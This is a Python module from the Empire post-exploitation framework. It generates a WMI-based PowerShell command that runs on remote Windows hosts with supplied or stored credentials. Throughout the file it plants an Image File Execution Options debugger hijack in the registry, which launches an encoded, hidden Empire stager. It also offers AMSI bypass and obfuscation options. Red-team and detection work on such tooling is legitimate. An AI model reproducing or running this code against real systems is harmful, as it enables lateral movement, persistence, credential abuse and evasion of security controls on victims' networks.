from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        
        script = """$null = Invoke-WmiMethod -Path Win32_process -Name create"""
        # Set booleans to false by default
        obfuscate = False
        amsi_bypass = False
        amsi_bypass2 = False

        # management options
        cleanup = params['Cleanup']
        binary = params['Binary']
        target_binary = params['TargetBinary']
        listener_name = params['Listener']
        username = params['UserName']
        password = params['Password']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']
        if (params['AMSIBypass']).lower() == 'true':
            amsi_bypass = True
        if (params['AMSIBypass2']).lower() == 'true':
            amsi_bypass2 = True

        # storage options
        reg_path = params['RegPath']

        status_msg = ""
        location_string = ""

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            
            if not main_menu.credentials.is_credential_valid(cred_id):
                print(helpers.color("[!] CredID is invalid!"))
                return ""

            (cred_id, credType, domain_name, username, password, host, os, sid, notes) = main_menu.credentials.get_credentials(cred_id)[0]

            if domain_name != "":
                params["UserName"] = str(domain_name) + "\\" + str(username)
            else:
                params["UserName"] = str(username)
            if password != "":
                params["Password"] = passw = password


        if cleanup.lower() == 'true':
            # the registry command to disable the debugger for the target binary
            payload_code = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"';"
            status_msg += " to remove the debugger for " + target_binary

        elif listener_name != '':
            # if there's a listener specified, generate a stager and store it
            if not main_menu.listeners.is_listener_valid(listener_name):
                # not a valid listener, return nothing for the script
                print(helpers.color("[!] Invalid listener: " + listener_name))
                return ""

            else:
                # generate the PowerShell one-liner with all of the proper options set
                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True, obfuscate=obfuscate, obfuscationCommand=obfuscate_command,AMSIBypass=amsi_bypass, AMSIBypass2=amsi_bypass2)
                
                encScript = launcher.split(" ")[-1]
                # statusMsg += "using listener " + listenerName

            path = "\\".join(reg_path.split("\\")[0:-1])
            name = reg_path.split("\\")[-1]

            # statusMsg += " stored in " + regPath + "."

            payload_code = "$RegPath = '"+reg_path+"';"
            payload_code += "$parts = $RegPath.split('\\');"
            payload_code += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
            payload_code += "$name = $parts[-1];"
            payload_code += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "+encScript+";"

            # note where the script is stored
            location_string = "$((gp "+path+" "+name+")."+name+")"

            payload_code += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+location_string+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';"

            status_msg += " to set the debugger for "+target_binary+" to be a stager for listener " + listener_name + "."

        else:
            payload_code = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"' -Name Debugger -Value '"+binary+"';"
            
            status_msg += " to set the debugger for "+target_binary+" to be " + binary + "."

        # unicode-base64 the payload code to execute on the targets with -enc
        encPayload = helpers.enc_powershell(payload_code)

        # build the WMI execution string
        computer_names = "\"" + "\",\"".join(params['ComputerName'].split(",")) + "\""

        script += " -ComputerName @("+computer_names+")"
        script += " -ArgumentList \"C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -enc " + encPayload.decode('UTF-8') + "\""

        # if we're supplying alternate user credentials
        if username != '':
            script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+username+"\",$PSPassword);" + script + " -Credential $Credential"

        script += ";'Invoke-Wmi executed on " +computer_names + status_msg+"'"

        script = helpers.keyword_obfuscation(script)
        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
        script = helpers.keyword_obfuscation(script)

        return script

